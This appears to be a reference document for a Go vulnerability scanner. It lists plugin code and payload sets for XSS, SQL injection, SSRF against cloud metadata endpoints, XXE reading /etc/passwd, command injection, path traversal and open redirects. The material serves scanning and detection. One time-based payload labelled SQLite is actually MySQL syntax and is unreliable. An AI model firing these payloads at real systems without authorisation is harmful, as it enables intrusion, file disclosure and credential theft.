# Vulnerability Patterns

**Category-specific detection patterns for OWASP Top 10 vulnerabilities.**

## XSS (Cross-Site Scripting)

### Reflected XSS

```go
type ReflectedXSSPlugin struct{}

func (p *ReflectedXSSPlugin) Payloads() []Payload {
    return []Payload{
        // Basic
        {Input: "<script>alert(1)</script>", Reflection: "<script>alert(1)</script>"},
        {Input: "<img src=x onerror=alert(1)>", Reflection: "onerror=alert(1)"},
        {Input: "<svg onload=alert(1)>", Reflection: "onload=alert(1)"},

        // Attribute escape
        {Input: "\" onload=\"alert(1)", Reflection: "onload=\"alert(1)"},
        {Input: "' onload='alert(1)", Reflection: "onload='alert(1)"},

        // JavaScript context
        {Input: "';alert(1);//", Reflection: "alert(1)"},
        {Input: "\");alert(1);//", Reflection: "alert(1)"},
    }
}
```

### Stored XSS Indicators

```go
func (p *StoredXSSPlugin) detectStored(ctx context.Context, target *Target) ([]Finding, error) {
    // 1. Submit payload via POST
    payload := generateUniquePayload() // e.g., "<script>alert('XSS-UUID')</script>"
    submitPayload(ctx, target, payload)

    // 2. Check if payload persisted and reflected
    time.Sleep(2 * time.Second) // Wait for processing
    resp, _ := getTarget(ctx, target)

    if strings.Contains(resp.Body, payload) {
        return []Finding{{
            Type:       "XSS-Stored",
            Severity:   Critical,
            Confidence: 0.9,
            Evidence:   payload,
        }}, nil
    }
    return nil, nil
}
```

### DOM-Based XSS Indicators

```go
func (p *DOMXSSPlugin) detectDOMSinks() []string {
    return []string{
        "document.write",
        "innerHTML",
        "outerHTML",
        "eval",
        "setTimeout",
        "setInterval",
        "location.href",
        "location.replace",
    }
}

func (p *DOMXSSPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    // Check if DOM sinks are used with user input
    sinks := p.detectDOMSinks()
    findings := []Finding{}

    for _, sink := range sinks {
        if strings.Contains(resp.Body, sink) && containsUserInput(resp.Body, sink) {
            findings = append(findings, Finding{
                Type:       "XSS-DOM",
                Severity:   High,
                Confidence: 0.6, // Requires manual verification
                Evidence:   fmt.Sprintf("DOM sink detected: %s", sink),
            })
        }
    }
    return findings, nil
}
```

## SQLi (SQL Injection)

### Error-Based Detection

```go
func (p *ErrorBasedSQLiPlugin) Payloads() []Payload {
    return []Payload{
        {Input: "'", Reflection: "SQL syntax"},
        {Input: "\"", Reflection: "SQL syntax"},
        {Input: "' OR '1'='1", Reflection: ""},
        {Input: "' AND 1=1--", Reflection: ""},
        {Input: "\" OR \"1\"=\"1", Reflection: ""},
    }
}

func (p *ErrorBasedSQLiPlugin) detectErrors(resp *Response) bool {
    errorPatterns := []string{
        "SQL syntax.*MySQL",
        "Warning.*mysql_",
        "PostgreSQL.*ERROR",
        "Microsoft OLE DB Provider for SQL Server",
        "ORA-[0-9]+",
        "SQLite.*error",
    }

    for _, pattern := range errorPatterns {
        if matched, _ := regexp.MatchString(pattern, resp.Body); matched {
            return true
        }
    }
    return false
}
```

### Time-Based Blind SQLi

```go
func (p *TimeBasedSQLiPlugin) Payloads() []TimeBasedPayload {
    return []TimeBasedPayload{
        // MySQL
        {Input: "' AND SLEEP(5)--", ExpectedDelay: 5 * time.Second},
        {Input: "' OR SLEEP(5)--", ExpectedDelay: 5 * time.Second},

        // PostgreSQL
        {Input: "'; SELECT pg_sleep(5)--", ExpectedDelay: 5 * time.Second},

        // SQL Server
        {Input: "'; WAITFOR DELAY '0:0:5'--", ExpectedDelay: 5 * time.Second},

        // SQLite (less reliable)
        {Input: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,BENCHMARK(50000000,MD5(0x41)))x FROM information_schema.tables GROUP BY x)a)--", ExpectedDelay: 5 * time.Second},
    }
}
```

### Union-Based SQLi

```go
func (p *UnionSQLiPlugin) Payloads() []Payload {
    return []Payload{
        {Input: "' UNION SELECT NULL--", Reflection: ""},
        {Input: "' UNION SELECT NULL,NULL--", Reflection: ""},
        {Input: "' UNION SELECT NULL,NULL,NULL--", Reflection: ""},
        {Input: "' UNION ALL SELECT NULL,NULL--", Reflection: ""},
    }
}
```

## SSRF (Server-Side Request Forgery)

### Internal Network Access

```go
func (p *SSRFPlugin) internalTargets() []string {
    return []string{
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://169.254.169.254", // AWS metadata
        "http://metadata.google.internal", // GCP metadata
        "http://192.168.0.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    }
}

func (p *SSRFPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    findings := []Finding{}

    // Try internal targets
    for _, internalURL := range p.internalTargets() {
        for paramName := range target.Parameters {
            modifiedParams := copyParams(target.Parameters)
            modifiedParams[paramName] = internalURL

            resp, err := makeRequest(ctx, target, modifiedParams)
            if err != nil {
                continue
            }

            // Check for internal response indicators
            if detectsInternalResponse(resp) {
                findings = append(findings, Finding{
                    Type:       "SSRF",
                    Severity:   Critical,
                    Confidence: 0.85,
                    Payload:    internalURL,
                    Evidence:   "Internal network response detected",
                })
            }
        }
    }

    return findings, nil
}
```

### Cloud Metadata Endpoints

```go
func (p *SSRFPlugin) cloudMetadataEndpoints() []string {
    return []string{
        "http://169.254.169.254/latest/meta-data/",  // AWS
        "http://metadata.google.internal/computeMetadata/v1/", // GCP
        "http://169.254.169.254/metadata/instance", // Azure
    }
}
```

## XXE (XML External Entity)

### Basic XXE Payloads

```go
func (p *XXEPlugin) Payloads() []Payload {
    return []Payload{
        {
            Input: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
            Reflection: "root:",
        },
        {
            Input: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server">]>
<root>&xxe;</root>`,
            Reflection: "",
        },
    }
}
```

### XXE with OOB

```go
func (p *XXEPlugin) OOBPayload(callbackURL string) Payload {
    return Payload{
        Input: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY %% xxe SYSTEM "http://%s">
%%xxe;
]>
<root></root>`, callbackURL),
    }
}
```

## Command Injection

### OS Command Patterns

```go
func (p *CommandInjectionPlugin) Payloads() []Payload {
    return []Payload{
        // Unix
        {Input: "; ls", Reflection: "bin"},
        {Input: "| ls", Reflection: "bin"},
        {Input: "& ls", Reflection: "bin"},
        {Input: "`ls`", Reflection: "bin"},
        {Input: "$(ls)", Reflection: "bin"},

        // Windows
        {Input: "& dir", Reflection: "Directory"},
        {Input: "| dir", Reflection: "Directory"},
        {Input: "&& dir", Reflection: "Directory"},
    }
}
```

### Blind Command Injection (Time-Based)

```go
func (p *CommandInjectionPlugin) BlindPayloads() []TimeBasedPayload {
    return []TimeBasedPayload{
        {Input: "; sleep 5", ExpectedDelay: 5 * time.Second},
        {Input: "| sleep 5", ExpectedDelay: 5 * time.Second},
        {Input: "& timeout 5", ExpectedDelay: 5 * time.Second}, // Windows
    }
}
```

## Path Traversal

### Directory Traversal Payloads

```go
func (p *PathTraversalPlugin) Payloads() []Payload {
    return []Payload{
        // Basic
        {Input: "../../../etc/passwd", Reflection: "root:"},
        {Input: "..\\..\\..\\windows\\win.ini", Reflection: "[fonts]"},

        // URL encoded
        {Input: "..%2F..%2F..%2Fetc%2Fpasswd", Reflection: "root:"},

        // Double encoded
        {Input: "..%252F..%252F..%252Fetc%252Fpasswd", Reflection: "root:"},

        // Absolute path
        {Input: "/etc/passwd", Reflection: "root:"},
        {Input: "C:\\windows\\win.ini", Reflection: "[fonts]"},
    }
}
```

## Open Redirect

### Redirect Patterns

```go
func (p *OpenRedirectPlugin) Payloads() []Payload {
    return []Payload{
        {Input: "https://evil.com"},
        {Input: "//evil.com"},
        {Input: "/\\evil.com"},
        {Input: "javascript:alert(1)"},
    }
}

func (p *OpenRedirectPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    findings := []Finding{}

    for _, payload := range p.Payloads() {
        for paramName := range target.Parameters {
            modifiedParams := copyParams(target.Parameters)
            modifiedParams[paramName] = payload.Input

            resp, err := makeRequest(ctx, target, modifiedParams)
            if err != nil {
                continue
            }

            // Check for redirect
            if resp.StatusCode >= 300 && resp.StatusCode < 400 {
                location := resp.Headers["Location"]
                if strings.Contains(location, payload.Input) {
                    findings = append(findings, Finding{
                        Type:       "Open Redirect",
                        Severity:   Medium,
                        Confidence: 0.9,
                        Payload:    payload.Input,
                        Evidence:   fmt.Sprintf("Redirect to: %s", location),
                    })
                }
            }
        }
    }

    return findings, nil
}
```

## Best Practices

1. **Payload Organization**: Group by vulnerability type and technique
2. **Context Awareness**: Match payloads to injection context
3. **Evidence Collection**: Capture specific indicators, not just response
4. **Confidence Scoring**: Lower confidence for blind techniques
5. **False Positive Reduction**: Verify exploitability, not just reflection
